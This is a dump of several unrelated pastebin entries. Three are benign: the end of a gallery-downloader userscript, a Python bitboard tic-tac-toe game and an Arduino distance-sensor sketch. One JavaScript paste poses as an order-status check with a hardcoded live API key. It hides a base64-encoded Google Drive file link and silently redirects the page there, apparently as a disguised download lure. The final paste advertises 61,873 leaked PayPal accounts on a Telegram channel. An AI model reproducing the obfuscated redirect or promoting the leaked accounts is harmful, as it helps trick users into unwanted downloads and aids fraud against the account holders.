        console.log(`Click detected. Waiting ${detectionDelay}ms to check for gallery images.`);

        // Wait a short time to allow DOM to update after click (e.g., gallery modal opening)
        setTimeout(() => {
             // Re-check if the statusIndicator is still valid after the timeout
             if (statusIndicator === null || !document.body.contains(statusIndicator)) {
                  console.log(""Timeout finished, but status indicator not found. Skipping gallery detection."");
                  return;
             }

            // Check if images matching the selector are now present
            const images = document.querySelectorAll(imageSelector);

            if (images.length > 0) {
                console.log(`Gallery detected (${images.length} images found). Checking if Downloader button should be shown.`);
                // If images are found and our overlay is not active, show the ""Downloader"" button
                if (overlay === null) {
                    showActivateButton();
                } else {
                    console.log(""Gallery detected, but overlay is already active."");
                }
            } else {
                console.log(""No gallery images found after delay."");
                // If no images are found, ensure the status text is shown (gallery closed or not opened)
                 if (overlay === null) { // Only show status text if overlay is not active
                     showStatusText();
                 } else {
                     console.log(""No images found, but overlay is active."");
                 }
            }
        }, detectionDelay);
    });


    // --- Script Execution Start ---

    // 1. Set up the persistent status indicator
    // This also handles checking if it's already set up by this *instance* of the script.
    setupStatusIndicator();

    // The global click listener and the activate button will handle showing the overlay
    // when a gallery is detected and the user clicks the button/indicator.

    console.log(`'${scriptIdentifier}' script initialized and listening for clicks.`);

})();
"
H4Em3KaJ,Python Bit Board Tic-Tac-Toe,Notimecelduv,Python,Wednesday 30th of April 2025 03:33:37 PM CDT,"# We'll use this package to get random moves for the computer player.
from random import randint

""""""
GLOSSARY
- A **line** is a row, column or diagonal.
- A **bit word** is a binary number used to represent data of some sort.
- A bit is said to be **set** when it is equal to 1. For example, in `0100` the bit at position 2 (counting from the right from zero) is set.
- A **mask** is a bit word used to check if certain bits in another number are set. Examples:
    - `n & 0011` is used to check if the first two bits in the number `n` are set,
    - `n2 = n | 0001` returns a number `n2` equal to `n` with its first bit set to 1.
- A **bit board** is a bit word used specifically to represent the board in a board game.

BOARD REPRESENTATION
The board is represented as a single bit word (a bit board).

bits 00-08 = X occupancy
bits 09-17 = O occupancy
bit 18     = active player

CELL INDICES
By convention, indices from 0 to 9 represent the cells on the board in the order below:

6 7 8
3 4 5
0 1 2

EXAMPLE
Given the board below:

O . X
. X .
. . .

the corresponding bit word is: 1 001000000 100010000
100010000 => X has played to cells 4 and 8
001000000 => O has played to cell 6
1         => it is O's turn to move
""""""

NB_ROWS = 3
"""""" Number of rows on the board. """"""

NB_COLS = NB_ROWS
"""""" Number of columns per row. """"""

NB_CELLS = NB_ROWS * NB_COLS
"""""" Total number of cells on the board. """"""

PLAYER_COMPUTER = 0
"""""" The AI player. Always goes first. """"""

PLAYER_HUMAN = 1
"""""" The human player. Always goes second. """"""

PLAYERS_SYMBOLS = [""X"", ""O""]
"""""" The characters used to represent each player when printing the board. """"""

STATE_LOSS = 0
"""""" A value indicating that the game was lost by the active player. """"""

STATE_DRAW = 1
"""""" A value indicating that the game is over and neither player won. """"""

STATE_ONGOING = 2
"""""" A value indicating that the game hasn't reached a result yet. """"""

NB_BITS_FULL_OCCUPANCY = NB_CELLS * 2
"""""" The number of bits to represent the occupancy of both players. """"""

NB_BITS_BOARD = NB_BITS_FULL_OCCUPANCY + 1
"""""" The number of bits in a bit board (including the active player). """"""

OCCUPANCY_MASK = (1 << NB_CELLS) - 1
"""""" A mask with 9 set bits. Used to detect if the board is full or single out a player's occupancy. """"""

BIT_MASKS = [1 << i for i in range(NB_BITS_BOARD)]
"""""" A list of masks each having a single set bit used for various bit manipulations. """"""

WIN_MASKS = []  # type: list[int]
"""""" A list of masks each having 3 set bits used to quickly detect if either player has filled a line. It is initialized later through a function call. """"""

BIT_INDEX_PLAYER = NB_BITS_FULL_OCCUPANCY
"""""" The index of the bit representing the active player in a bit board. """"""


def coordsToIndex(row: int, col: int) -> int:
    """""" Convert a row and column to a board index. """"""
    return row * NB_COLS + col


def initWinMasks() -> None:
    """""" The masks should look like this:
        000 000 111,
        000 111 000,
        111 000 000,
        001 001 001,
        010 010 010,
        100 100 100,
        100 010 001,
        001 010 100

        They each represent a line that can be filled to win the game.
    """"""
    diagonalMask = 0
    antiDiagonalMask = 0

    for row in range(NB_ROWS):
        rowMask = 0
        colMask = 0

        for col in range(NB_COLS):
            rowMask |= BIT_MASKS[coordsToIndex(row, col)]
            colMask |= BIT_MASKS[coordsToIndex(col=row, row=col)]

        WIN_MASKS.append(rowMask)
        WIN_MASKS.append(colMask)
        diagonalMask |= BIT_MASKS[coordsToIndex(row, row)]
        antiDiagonalMask |= BIT_MASKS[coordsToIndex(row, NB_ROWS - row - 1)]

    WIN_MASKS.append(diagonalMask)
    WIN_MASKS.append(antiDiagonalMask)


def getActivePlayer(board: int) -> int:
    return board >> BIT_INDEX_PLAYER


def oppositePlayer(player: int) -> int:
    # Since `player` is always equal to 0 or 1, it can be reversed by toggling it (XOR operator).
    return player ^ 1


def getOccupancy(board: int, player: int) -> int:
    """""" Extract the part of a bit board representing the cells occupied by a given player. """"""
    return board >> (NB_CELLS * player) & OCCUPANCY_MASK


def isCellOccupied(occ: int, cell: int) -> bool:
    bitMask = BIT_MASKS[cell]
    # If the cell wasn't occupied, then `fullOcc & bitMask` would be equal to 0.
    return (occ & bitMask) != 0


def getFreeCells(board: int) -> list[int]:
    """""" Get a list of unoccupied cell indices. """"""
    computerOcc = getOccupancy(board, PLAYER_COMPUTER)
    humanOcc = getOccupancy(board, PLAYER_HUMAN)
    fullOcc = computerOcc | humanOcc
    freeCells = []  # type: list[int]

    for cell in range(NB_CELLS):
        if not isCellOccupied(fullOcc, cell):
            freeCells.append(cell)

    return freeCells


def getState(board: int) -> int:
    """""" Check if the game is lost, drawn or still in play. """"""
    activePlayer = getActivePlayer(board)
    inactivePlayer = oppositePlayer(activePlayer)
    inactiveOcc = getOccupancy(board, inactivePlayer)

    for mask in WIN_MASKS:
        if (inactiveOcc & mask) == mask:
            return STATE_LOSS

    activeOcc = getOccupancy(board, activePlayer)
    fullOcc = activeOcc | inactiveOcc

    if fullOcc == OCCUPANCY_MASK:
        return STATE_DRAW

    return STATE_ONGOING


def promptHumanMove(board: int) -> int:
    """""" Ask user to enter a move via the command line. """"""
    fullOcc = board & ~BIT_MASKS[BIT_INDEX_PLAYER]
    prompt = ""Please choose a free cell from the above board: ""

    try:
        move = int(input(prompt))

        if move < 0 or move >= NB_CELLS:
            print(f""Invalid move: should be in the range [0;{NB_CELLS}[."")
            # Call function again to query user once more.
            return promptHumanMove(board)

        if isCellOccupied(fullOcc, move):
            print(""This cell is occupied."")
            return promptHumanMove(board)

        return move
    except:
        print(""Invalid input!"")
        return promptHumanMove(board)


def getComputerMove(board: int) -> int:
    freeCells = getFreeCells(board)
    # Pick a random move for the computer to play.
    randomIndex = randint(0, len(freeCells) - 1)
    return freeCells[randomIndex]


def printBoard(board: int) -> None:
    """""" Display a visual representation of the board. """"""

    # Command line colors
    FG_YELLOW = ""\033[93m""
    FG_CYAN = ""\033[96m""
    CLR_RESET = ""\033[0m""

    computerOcc = getOccupancy(board, PLAYER_COMPUTER)
    humanOcc = getOccupancy(board, PLAYER_HUMAN)

    for row in range(NB_ROWS):
        for col in range(NB_COLS):
            # Row is reversed in order to print the first row at the bottom.
            index = coordsToIndex(NB_ROWS - row - 1, col)

            if isCellOccupied(computerOcc, index):
                print(
                    FG_CYAN + PLAYERS_SYMBOLS[PLAYER_COMPUTER] + CLR_RESET, end="" "")
                continue

            if isCellOccupied(humanOcc, index):
                print(
                    FG_YELLOW + PLAYERS_SYMBOLS[PLAYER_HUMAN] + CLR_RESET, end="" "")
                continue

            print(index, end="" "")

        print()


def play() -> None:
    board = 0
    # Counting the number of moves played to avoid an infinite loop.
    nbMovesPlayed = 0

    while nbMovesPlayed <= NB_CELLS:
        activePlayer = getActivePlayer(board)
        inactivePlayer = oppositePlayer(activePlayer)
        state = getState(board)

        if state == STATE_LOSS:
            print(f""{PLAYERS_SYMBOLS[inactivePlayer]} wins!"")
            break

        if state == STATE_DRAW:
            print(""The game is a draw."")
            break

        if activePlayer == PLAYER_COMPUTER:
            move = getComputerMove(board)
            board |= BIT_MASKS[move]
            print(f""The computer played to cell {move}."")
        elif activePlayer == PLAYER_HUMAN:
            move = promptHumanMove(board)
            board |= BIT_MASKS[move + NB_CELLS]

        print()
        printBoard(board)
        print()

        # Toggle player
        board ^= BIT_MASKS[BIT_INDEX_PLAYER]
        nbMovesPlayed += 1


def main() -> None:
    initWinMasks()
    play()


# Ensure the `main` function is only called when this script is run directly.
if __name__ == ""__main__"":
    main()
"
ivGKtati,**Distance Measurement** rev_01,pleasedontcode,Arduino,Wednesday 30th of April 2025 03:33:29 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: **Distance Measurement**
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-04-30 20:32:33

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* O sistema deve inicializar um display */
	/* LiquidCrystal para apresentar mensagens de status */
	/* do sistema, incluindo notifica√ß√µes de erro e */
	/* feedback operacional, garantindo ao usu√°rio a */
	/* conscientiza√ß√£o sobre o desempenho do dispositivo. */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <LiquidCrystal.h>	//https://github.com/arduino-libraries/LiquidCrystal

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
#define TRIGGER_PIN 2 
#define ECHO_PIN 3 
#define RED_LED_PIN 4 
#define YELLOW_LED_PIN 5 
#define GREEN_LED_PIN 6 
#define BUZZER_PIN 7 

// Inicializando o LCD 
LiquidCrystal lcd(8, 9, 10, 11, 12, 13); 

// Vari√°veis globais 
long duration; // Vari√°vel para armazenar o tempo de retorno do sinal do sensor 
int distance; // Vari√°vel para armazenar a dist√¢ncia em cm 
int ledState = LOW; // Vari√°vel para controlar o estado do LED indicativo 
unsigned long previousMillis = 0; // Vari√°vel para armazenar o tempo anterior 
const long interval = 1000; // Intervalo de tempo para atualiza√ß√£o do LCD e LEDs 

void setup(void)
{
	// put your setup code here, to run once:
  
  // Inicializando os pinos como entrada ou sa√≠da 
  pinMode(TRIGGER_PIN, OUTPUT); 
  pinMode(ECHO_PIN, INPUT); 
  pinMode(RED_LED_PIN, OUTPUT); // Changed from SA√çDA to OUTPUT
  pinMode(YELLOW_LED_PIN, OUTPUT); // Changed from SA√çDA to OUTPUT
  pinMode(GREEN_LED_PIN, OUTPUT); // Changed from SA√çDA to OUTPUT
  pinMode(BUZZER_PIN, OUTPUT); // Changed from SA√çDA to OUTPUT

  // Inicializando o LCD com 2 colunas e 16 linhas 
  lcd.begin(16, 2); 

  // Imprimindo as mensagens iniciais no LCD 
  lcd.print(""Distancia: ""); 
  lcd.setCursor(0, 1); 
  lcd.print(""Barra: ""); 
}

void loop(void)
{
	// put your main code here, to run repeatedly:
  
  // Gerando o pulso de 10 microssegundos no pino do trigger 
  digitalWrite(TRIGGER_PIN, LOW); 
  delayMicroseconds(2); // Changed from atrasoMicrossegundos to delayMicroseconds
  digitalWrite(TRIGGER_PIN, HIGH); // Changed from ALTO to HIGH
  delayMicroseconds(10); // Changed from atrasoMicrossegundos to delayMicroseconds
  digitalWrite(TRIGGER_PIN, LOW); 

  // Medindo o tempo de retorno do sinal do sensor 
  duration = pulseIn(ECHO_PIN, HIGH); // Changed from length to duration

  //Calculando a dist√¢ncia em cm 
  distance = duration * 0.034 / 2; 

  // Atualizando o LCD com a dist√¢ncia em cm 
  lcd.setCursor(10, 0); 
  lcd.print(distance); // Changed from dist√¢ncia to distance

  // Atualizando a barra de caracteres no LCD 
  lcd.setCursor(6, 1); 
  for (int i = 0; i < distance / 2; i++) { 
    lcd.print(""*""); 
  } 
  lcd.print("" ""); 

  // Atualizando os LEDs indicativos de acordo com a dist√¢ncia 
  if (distance <= 10) { 
    digitalWrite(RED_LED_PIN, HIGH); 
    digitalWrite(YELLOW_LED_PIN, LOW); // Changed from BAIXO to LOW
    digitalWrite(GREEN_LED_PIN, LOW); 
    lcd.setCursor(0, 1);
    lcd.print(""Erro: Muito perto""); // Display error message
  } 
  else if (distance > 10 && distance <= 20) { // Changed from caso contr√°rio, se to else if
    digitalWrite(RED_LED_PIN, LOW); 
    digitalWrite(YELLOW_LED_PIN, HIGH); // Changed from ALTO to HIGH
    digitalWrite(GREEN_LED_PIN, LOW); 
    lcd.setCursor(0, 1);
    lcd.print(""Aten√ß√£o: Dist√¢ncia m√©dia""); // Display warning message
  } 
  else if (distance > 20 && distance <= 30) { // Changed from caso contr√°rio, se to else if
    digitalWrite(RED_LED_PIN, LOW);
    digitalWrite(YELLOW_LED_PIN, LOW); 
    digitalWrite(GREEN_LED_PIN, HIGH); 
    lcd.setCursor(0, 1);
    lcd.print(""Tudo certo!""); // Display operational feedback
  } 
  else { 
    digitalWrite(RED_LED_PIN, LOW); 
    digitalWrite(YELLOW_LED_PIN, LOW); 
    digitalWrite(GREEN_LED_PIN, LOW); 
    lcd.setCursor(0, 1);
    lcd.print(""Erro: Dist√¢ncia excessiva""); // Display error message
  } 

  // Atualizando o estado do LED indicativo a cada segundo 
  unsigned long currentMillis = millis(); 
  if (currentMillis - previousMillis >= interval) { 
    previousMillis = currentMillis; 
    if (ledState == LOW) { 
      ledState = HIGH; 
    } else { 
      ledState = LOW; 
    } 
    digitalWrite(BUZZER_PIN, ledState); 
  } 
}

/* END CODE */"
frTUBrnf,Untitled,kammex,JavaScript,Wednesday 30th of April 2025 03:28:29 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/82328/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
M8JbAPVF,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Wednesday 30th of April 2025 03:28:25 PM CDT,61873 Accounts Posted On https://t.me/leakzbyeminem
